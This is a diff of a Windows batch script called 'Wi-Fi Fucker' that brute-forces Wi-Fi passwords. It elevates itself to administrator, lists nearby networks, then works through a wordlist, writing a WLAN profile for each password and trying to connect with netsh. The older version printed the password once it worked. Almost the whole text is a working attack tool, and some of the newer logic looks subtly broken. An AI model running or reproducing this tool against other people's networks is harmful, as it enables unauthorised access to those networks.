@@ -1,50 +1,35 @@
 @echo off
 cd /d "%~dp0"
-goto dependencies
 
-:dependencies
+:admin
 color 1
-title Checking dependencies...
-cls
+title admin request...
 
-where powershell >nul 2>&1
-if %errorlevel% equ 0 (
-    echo.
-) else (
-    echo    [ERROR] Script requires Powershell to run.
-)
+echo    [INFO] Starting Script as an administrator...
+net session >nul 2>&1 || (powershell -EP Bypass -NoP -C start "%~0" -verb runas &exit /b)
+cls && goto start
 
-echo    [INFO] Starting Script as an Administrator...
-net session >nul 2>&1 || (
-    powershell -EP Bypass -NoP -C start "%~0" -verb runas >nul
-    if errorlevel 1 (
-        echo.
-        echo    [ERROR] Script requires Administrator privileges to run.
-        echo    [INFO] Press any key to exit.
-        pause >nul
-        exit /b 1
-    )
-    exit /b
-)
-cls
-
+:start
 color 4
+title Initialising...
+cls
+
 where netsh >nul 2>&1
-if errorlevel 1 (
-    echo.
+if %errorlevel% neq 0 (
     echo    [ERROR] The "netsh" command is not available on this system. Please ensure compatibility.
-    echo    [INFO] Press any key to exit.
+    echo.
+    echo    Press any key to exit.
     pause >nul
     exit /b
 )
 
 sc query wlansvc | find /i "RUNNING" >nul 2>&1
-if errorlevel 1 (
+if %errorlevel% neq 0 (
+    echo    [ERROR] The "WLAN AutoConfig" service is not running, Wi-Fi is disabled, or you are using an Ethernet connection.
     echo.
-    echo    [ERROR] The "WLAN AutoConfig" service is not running, Wi-Fi is disabled, or an Ethernet connection is being used.
-    echo    [INFO] Press any key to exit.
+    echo    Press any key to try again.
     pause >nul
-    goto dependencies
+    goto start
 )
 
 goto menu
@@ -57,9 +42,9 @@ echo    ====================================
 echo                   HELP
 echo    ====================================
 echo.
-echo    Dependencies: Powershell, at least Windows 10, english system
+echo    Dependencies: Powershell, At least Windows 10
 echo.
-echo    [INFO] Press any key to return to the menu.
+echo    Press any key to return to the menu.
 pause >nul
 goto menu
 
@@ -86,19 +71,20 @@ echo       -h for help or -r to refresh
 echo    ===================================
 echo.
 
-netsh wlan show interfaces | findstr /R /C:"^ *Name" /C:"^ *Description" /C:"^ *Physical address" /C:"^ *Interface Type" /C:"^ *Signal" /C:"^ *Band"
-if errorlevel 1 (
+netsh wlan show interfaces
+if %errorlevel% neq 0 (
     echo.
-    echo    [ERROR] No Wi-Fi adapter detected or an Ethernet connection is being used.
-    echo    [INFO] Press any key to exit.
+    echo    [ERROR] No Wi-Fi adapter detected or using an Ethernet connection.
+    echo    Press any key to return to the menu.
     pause >nul
-    exit /b
+    goto start
 )
 
 echo.
-set /p interface="Enter interface name: "
+set /p interface="Enter Interface name: "
+
 if /i "%interface%"=="-r" goto show_interface
-if not defined interface (
+if "%interface%"=="" (
     echo    [Invalid input] Interface name cannot be empty.
     pause >nul
     goto show_interface
@@ -115,48 +101,56 @@ if exist "%bannerpath%" (
 )
 echo    ==================================================
 echo             Available Wi-Fi Networks Nearby:
-echo              Scan Time: %date% %time:~0,8%
-echo       -h for help or -r to refresh or -b to return
 echo    ==================================================
+echo.
 netsh wlan show networks interface="%interface%"
 if %errorlevel% neq 0 (
-    echo    [ERROR] This Problem may be caused because no Wi-Fi adapter was detected or you are using an Ethernet connection.
+    echo    [ERROR] No networks found or using Ethernet connection.
     echo    Press any key to return to the menu.
     pause >nul
     goto start
 )
 
-goto enter_SSID
-
 :enter_SSID
+echo.
 set /p SSID="Enter the SSID of the Network: "
-if not defined SSID (
-    echo    [Invalid input] SSID cannot be empty.
+if "%SSID%"=="" (
+    echo    [Invalid input] SSID cannot be left out.
     goto enter_SSID
 )
-goto enter_WPA
+
+set "SSID_with_space=%SSID%"
 
 :enter_WPA
-set /p WPA="Enter the WPA version (WPA2 or WPA3 only): "
+set /p WPA="Enter the WPA version (WPA2 or WPA3): "
 if /i "%WPA%"=="WPA2" (
     set "WPA=WPA2PSK"
 ) else if /i "%WPA%"=="WPA3" (
     set "WPA=WPA3SAE"
 ) else (
-    echo.
-    echo    [Invalid input] WPA version "%WPA%" is not supported. Use "WPA2" or "WPA3".
+    if "%WPA%"=="" (
+        echo.
+        echo    [Invalid input] WPA version cannot be left out.
+        echo.
+    ) else (
+        echo.
+        echo    [Invalid Input] WPA version "%WPA%" unsupported. Only "WPA2" or "WPA3" are supported.
+        echo.
+    )
     goto enter_WPA
 )
 
 :enter_wordlist
-set /p WordlistPath="Enter the path to the wordlist (see help for conditions): "
-if not defined WordlistPath (
+set /p WordlistPath="Enter the name of the wordlist (place your wordlist inside Wi-Fi_Fucker/wordlist) or press enter to use default: "
+
+if "%WordlistPath%"=="" (
     set "WordlistPath=%~dp0wordlist\word.txt"
 )
 
 if not exist "%WordlistPath%" (
     echo.
     echo    [ERROR] Wordlist file not found at "%WordlistPath%".
+    echo.
     goto enter_wordlist
 )
 
@@ -169,10 +163,7 @@ if exist "%bannerpath%" (
 ) else (
     echo.
     echo    [ERROR] Banner file not found. Skipping.
-)
-
-for /f %%D in ('powershell -Command "[BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes('%SSID%')).Replace('-', '')"') do (
-    set "hex=%%D"
+    echo.
 )
 
 set "encryption=AES"
@@ -185,22 +176,19 @@ echo       Interface:        %interface%
 echo       SSID:             %SSID%
 echo       Wordlist Path:    %WordlistPath%
 echo       WPA Version:      %WPA%
-echo       HEX:              %hex%
 echo       Encryption:       %encryption%
 echo       Connection Type:  %conType%
 echo    =======================================================
 echo.
 echo.
 
-set /p checkTable="Do you want to edit these values (Y/N): "
+set /p checkTable="Do you want to edit these Values (Y/N): "
 if /i "%checkTable%"=="Y" goto edit
-if /i "%checkTable%"=="N" goto initalizing
+if /i "%checkTable%"=="N" goto create_xml
 echo.
 echo    [Invalid input] Please enter "Y" to continue or "N" to edit.
-echo    [INFO] Press any key to try again.
 pause >nul
 goto check
-
 
 :edit
 cls
@@ -211,7 +199,7 @@ if exist "%bannerpath%" (
     echo    [ERROR] Banner file not found. Skipping.
     echo.
 )
-echo    WARNING: Editing these values is highly discouraged!
+echo    WARNING! IT'S HIGHLY RECOMMENDED NOT TO EDIT THESE VALUES!
 echo.
 echo    Type in the new Values. Press enter to skip a Value.
 echo.
@@ -224,54 +212,46 @@ set /p new_WordlistPath="Wordlist to use (current: %WordlistPath%): "
 if not "%new_WordlistPath%"=="" set "WordlistPath=%new_WordlistPath%"
 set /p new_WPA="WPA version to use (current: %WPA%): "
 if not "%new_WPA%"=="" set "WPA=%new_WPA%"
-set /p new_hex="hex(current: %hex%): "
-if not "%new_hex%"=="" set "hex=%new_hex%"
 set /p new_encryption="Encryption Type of Target (current: %encryption%): "
 if not "%new_encryption%"=="" set "encryption=%new_encryption%"
 set /p new_conType="Connection Type to use (current: %conType%): "
 if not "%new_conType%"=="" set "conType=%new_conType%"
 goto check
 
-:initalizing
-netsh wlan disconnect >nul
+:create_xml
 set "batch=0"
 set "SSID_with_space="
 set "SSID_escaped="
 
 sc query wlansvc | find /i "RUNNING" >nul 2>&1
-if errorlevel 1 (
-    echo.
+if not errorlevel 0 (
     echo    [ERROR] The "WLAN AutoConfig" service is not running or Wi-Fi is disabled or you are using an Ethernet connection.
-    echo    [INFO] Press any key to exit.
-    pause >nul
-    exit /b
+    pause
+    goto start
 )
 
 echo.
-echo    [INFO] Checking for old profiles...
-del /q "profiles" >nul 2>&1
-if not exist "profiles" mkdir "profiles"
+echo    [INFO] Checking for old Profiles...
+if not exist "Profiles" mkdir "Profiles"
+del /q "Profiles\*.xml" >nul 2>&1
+netsh wlan delete profile name="%SSID%" >nul
 
 if not exist "%WordlistPath%" (
     echo    [ERROR] The wordlist file does not exist or the path is invalid.
-    echo    [INFO] Press any key to continue.
-    pause >nul
+    pause
     goto show_networks
 )
-
-echo.
-echo    [INFO] Processing the wordlist (bigger files need longer)...
 
 for /f "delims=" %%A in ('type "%WordlistPath%"') do set "check_line=%%A"
 if "%check_line%"=="" (
     echo    [ERROR] The wordlist is empty or invalid.
-    echo    [INFO] Press any key to continue.
     pause >nul
     goto show_networks
 )
-goto create_xml
 
-:create_xml
+echo.
+echo    [INFO] Processing Wordlist...
+ping 127.0.0.1 -n 2 > nul
 cls
 if exist "%bannerpath%" (
     type "%bannerpath%"
@@ -280,13 +260,35 @@ if exist "%bannerpath%" (
     echo    [ERROR] Banner file not found. Skipping.
     echo.
 )
-echo    --- Trying to get the Password for %SSID% ---
-echo.
-
 set "file_count=0"
+set "group_number=1"
 
 for /f "tokens=*" %%A in ('type "%WordlistPath%"') do (
     call :processline "%%A"
+    set /a file_count+=1
+    if %file_count% EQU 10 (
+        echo.
+        echo    --- Creating XML for group %group_number% with 10 keys ---
+        call :process_group
+        call :test_group
+        if %ERRORLEVEL% NEQ 0 (
+            echo    [INFO] Group %group_number% failed, removing profiles and proceeding to next group.
+            del /q "Profiles\*.xml" >nul 2>&1
+        )
+        set /a group_number+=1
+        set "file_count=0"
+    )
+)
+
+if %file_count% GTR 0 (
+    echo.
+    echo    --- Creating XML for remaining %file_count% keys ---
+    call :process_group
+    call :test_group
+    if %ERRORLEVEL% NEQ 0 (
+        echo    [INFO] Remaining group failed, removing profiles.
+        del /q "Profiles\*.xml" >nul 2>&1
+    )
 )
 
 goto :eof
@@ -294,7 +296,7 @@ goto :eof
 :processline
 set "line=%~1"
 if not defined line (
-    echo    [ERROR] Empty key. Skipping.
+    echo [ERROR] Empty key. Skipping.
     goto :eof
 )
 
@@ -302,18 +304,14 @@ set "lineLength=0"
 for /l %%i in (1,1,63) do if not "!line:~%%i,1!"=="" set /a lineLength+=1
 
 if %lineLength% lss 8 (
-    echo    [ERROR] Key must be at least 8 characters. Skipping.
+    echo [ERROR] Key must be at least 8 characters. Skipping.
     goto :eof
 )
 
 if %lineLength% gtr 63 (
-    echo    [ERROR] Key must be at most 63 characters. Skipping.
+    echo [ERROR] Key must be at most 63 characters. Skipping.
     goto :eof
 )
-set /a batch=batch+1
-
-echo.
-echo    [Attack] Attempt number %batch% with Password %line%
 
 set "line=%line:&=&amp;%"
 set "line=%line:<=&lt;%"
@@ -326,6 +324,7 @@ set "SSID_escaped=%SSID_escaped:<=&lt;%"
 set "SSID_escaped=%SSID_escaped:>=&gt;%"
 set "SSID_escaped=%SSID_escaped:"=&quot;%"
 
+set /a batch=batch+1
 
 (
     echo ^<?xml version="1.0"?^>
@@ -333,7 +332,6 @@ set "SSID_escaped=%SSID_escaped:"=&quot;%"
     echo     ^<name^>%SSID%^</name^>
     echo     ^<SSIDConfig^>
     echo         ^<SSID^>
-    echo             ^<hex^>%hex%^</hex^>
     echo             ^<name^>%SSID%^</name^>
     echo         ^</SSID^>
     echo     ^</SSIDConfig^>
@@ -357,71 +355,51 @@ set "SSID_escaped=%SSID_escaped:"=&quot;%"
     echo         ^<enableRandomization^>false^</enableRandomization^>
     echo     ^</MacRandomization^>
     echo ^</WLANProfile^>
-) > profiles\%batch%.xml
+) > Profiles\%SSID_with_space%%batch%.xml
+goto :eof
 
-netsh wlan add profile filename="profiles\%batch%.xml" user=current interface="%interface%" >nul
+:process_group
+rem XML files are ready. Add additional group processing logic if needed.
+goto :eof
 
-setlocal
-
-netsh wlan connect name="%SSID%" >nul
-goto check_connection
-
-:check_connection
-set "ConnectionState="
-set /a AssociatingCount=1
-
-:check_loop
-for /f "tokens=2 delims=:" %%A in ('netsh wlan show interfaces 2^>^&1 ^| findstr /i "State"') do (
-    set "ConnectionState=%%A"
+:test_group
+set "success=0"
+echo.
+echo    Adding profiles to %SSID%...
+for /l %%i in (1,1,10) do (
+    if exist "Profiles\%%i.xml" netsh wlan add profile filename="Profiles\%%i.xml" user=current interface="%interface%" >nul
 )
-if not defined ConnectionState (
-    echo [ERROR] Unable to detect connection state. Retrying...
-    timeout /t 1 >nul
-    goto check_loop
+ping 127.0.0.1 -n 3 >nul
+echo.
+echo    Trying to connect with %SSID%...
+for /l %%i in (1,1,10) do (
+    if exist "Profiles\%%i.xml" (
+        netsh wlan connect name="%SSID%" profile="Profiles\%%i.xml" >nul
+        if %ERRORLEVEL%==0 goto success
+    )
 )
 
-set "ConnectionState=%ConnectionState:~1%"
+:success
+ping 127.0.0.1 -n 6 >nul
 
-if /i "%ConnectionState%"=="connected" (
+netsh wlan show interfaces | findstr /C:"%SSID%" >nul
+if %ERRORLEVEL%==0 (
+    set "success=1"
     echo.
-    echo    --- Password: %line% ---
+    echo     [INFO] Successfully connected to %SSID%!
     echo.
     goto return
-) else if /i "%ConnectionState%"=="disconnected" (
-    goto delete
-) else if /i "%ConnectionState%"=="disconnecting" (
-    timeout /t 1 >nul
-    goto check_loop
-) else if /i "%ConnectionState%"=="associating" (
-    set /a AssociatingCount+=1
-    if %AssociatingCount% gtr 2 (
-        goto delete
-    )
-    timeout /t 1 >nul
-    goto check_loop
-) else if /i "%ConnectionState%"=="authenticating" (
-    timeout /t 1 >nul
-    goto check_loop
-) else if /i "%ConnectionState%"=="searching" (
-    timeout /t 1 >nul
-    goto check_loop
-) else (
-    echo [ERROR] Unknown status detected: %ConnectionState%. Retrying...
-    timeout /t 1 >nul
-    goto check_loop
 )
+
+if %success%==0 exit /b 1
+echo Didn't succeed. Continuing...
+goto :eof
 
 :return
 set /p option="Do you want to leave Wi-Fi Fucker (l) or return to the main menu (m): "
 if /i "%option%"=="l" exit
 if /i "%option%"=="m" goto menu
 echo.
-echo    [Invalid input] Please enter "l" to leave or "m" to return to the menu.
-echo    [INFO] Press any key to try again.
+echo     [Invalid input] Please enter "l" to leave or "m" to return to the menu.
 pause >nul
 goto return
-
-:delete
-setlocal
-powershell -Command "Remove-Item -Path 'profiles\%batch%.xml' -Force"
-endlocal
